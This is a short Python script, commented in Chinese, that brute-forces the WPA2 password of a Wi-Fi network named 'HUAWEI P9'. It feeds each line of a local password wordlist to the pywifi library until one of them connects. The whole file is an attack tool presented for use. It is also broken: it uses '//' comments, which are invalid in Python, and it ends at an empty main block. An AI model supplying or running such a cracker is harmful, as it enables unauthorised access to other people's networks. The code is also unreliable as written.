import pywifi
from pywifi import const
import time

import wifi


//测试连接，返回链接结果
def wifiConnect(pwd):
    //抓取网卡接口
    wifi = pywifi.PyWiFi()
    //获取第一个无线网卡
    ifaces = wifi.interfaces()[1]
    //断开所有连接
    ifaces.disconnect()
    time.sleep(5)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        //创建WiFi连接文件
        profile = pywifi.Profile()
        //要连接WiFi的名称
        profile.ssid = "HUAWEI P9"
        //网卡的开放状态
        profile.auth = const.AUTH_ALG_OPEN
        //wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        //加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        //调用密码
        profile.key = pwd
        //删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        //设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        //wifi连接时间
        time.sleep(5)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("already......")

//读取密码本


def readPassword():
    print("begain.....:")
    //密码本路径
    path = "D:\pythontest\password.txt"
    //打开文件
    file = open(path, "r")
    while True:
        try:
            //一行一行读取
            pad = file.readline()
            bool = wifiConnect(pad)

            if bool:
                print("ok... ", pad)

                break
            else:
                //跳出当前循环，进行下一次循环
                print("wait.... ", pad)
        except:
            continue


if __name__ == "__main__":
